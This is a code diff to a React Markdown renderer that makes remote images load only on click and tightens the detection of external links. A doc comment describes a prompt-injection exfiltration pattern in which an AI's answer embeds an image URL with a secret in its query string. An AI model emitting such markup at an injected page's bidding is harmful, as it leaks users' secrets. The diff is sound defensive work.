@@ -6,7 +6,7 @@ import type { createLowlight } from 'lowlight'
 import { cn } from '@/lib/utils'
 import { CodeBlock } from './code-block'
 import { Diagram } from './diagram'
-import { withGroups } from '@/i18n'
+import { useT, withGroups } from '@/i18n'
 
 // ```git blocks: the live graph of a repository (features/git), loaded the first time one shows up.
 const GitBlock = React.lazy(withGroups(['git'], () => import('@/features/git/GitBlock')))
@@ -70,6 +70,27 @@ function textOf(node: React.ReactNode): string {
 }
 
 const SAFE_URL = /^(https?:|mailto:|\/|#|\.{0,2}\/)/i
+/** Off this site: `https://…` and protocol-relative `//host/…`. */
+const EXTERNAL = /^(https?:)?\/\//i
+
+/** A remote picture loads only on a click: an answer that embeds `![](https://host/?d=<secret>)` (a prompt injection
+ * in a page Claude read) would otherwise send it the moment the message shows. Pictures of this site load at once. */
+function RemoteImage({ src, alt }: { src: string; alt: string }) {
+  const t = useT()
+  const [shown, setShown] = React.useState(false)
+  if (shown) return <img src={src} alt={alt} loading="lazy" referrerPolicy="no-referrer" />
+  let host = src
+  try {
+    host = new URL(src, location.href).host
+  } catch {
+    // shown as written
+  }
+  return (
+    <button type="button" onClick={() => setShown(true)} title={src} className="inline-flex max-w-full items-center gap-1 rounded border border-dashed px-2 py-0.5 text-[0.9em] text-muted-foreground hover:text-foreground">
+      <span className="truncate">{alt ? `${alt} · ` : ''}{t('md.loadImage', { host })}</span>
+    </button>
+  )
+}
 
 export type MarkdownProps = {
   children: string
@@ -86,7 +107,9 @@ export type MarkdownProps = {
  * open in a new tab with rel="noopener noreferrer nofollow", code blocks are highlighted with a copy button,
  * ```mermaid blocks are drawn as diagrams, ```git blocks as the live graph of a repository.
  */
-export function Markdown({ children, className, onLink, components }: MarkdownProps) {
+// Memoized: a parent that re-renders for something else (a dictionary group arriving re-renders every `useT` user)
+// reuses the parsed tree instead of parsing and highlighting the whole text again.
+export const Markdown = React.memo(function Markdown({ children, className, onLink, components }: MarkdownProps) {
   // Re-render once the grammars are there - only the messages that have something to highlight (the others would
   // parse their whole text again for the same output).
   React.useSyncExternalStore(subscribeLowlight, FENCE_LANG.test(children) ? lowlightReady : noHighlight)
@@ -110,13 +133,13 @@ export function Markdown({ children, className, onLink, components }: MarkdownPr
             </a>
           )
         // Internal app routes stay in the SPA (no full reload).
-        if (href.startsWith('/') && !href.startsWith('//') && !href.startsWith('/api/'))
+        const external = EXTERNAL.test(href)
+        if (href.startsWith('/') && !external && !href.startsWith('/api/'))
           return (
             <Link to={href} {...(rest as object)}>
               {c}
             </Link>
           )
-        const external = /^https?:/i.test(href)
         return (
           <a href={href} {...(external ? { target: '_blank', rel: 'noopener noreferrer nofollow' } : {})} {...rest}>
             {c}
@@ -151,7 +174,8 @@ export function Markdown({ children, className, onLink, components }: MarkdownPr
       },
       img({ src, alt }) {
         const s = typeof src === 'string' ? src : ''
-        return SAFE_URL.test(s) ? <img src={s} alt={alt || ''} loading="lazy" /> : null
+        if (!SAFE_URL.test(s) || /^mailto:/i.test(s)) return null
+        return EXTERNAL.test(s) ? <RemoteImage src={s} alt={alt || ''} /> : <img src={s} alt={alt || ''} loading="lazy" />
       },
       ...components,
     }),
@@ -167,7 +191,7 @@ export function Markdown({ children, className, onLink, components }: MarkdownPr
       </ReactMarkdown>
     </div>
   )
-}
+})
 
 /** Above this size (characters) a text is shown as plain text instead of formatted. */
 const MAX_MARKDOWN = 300_000
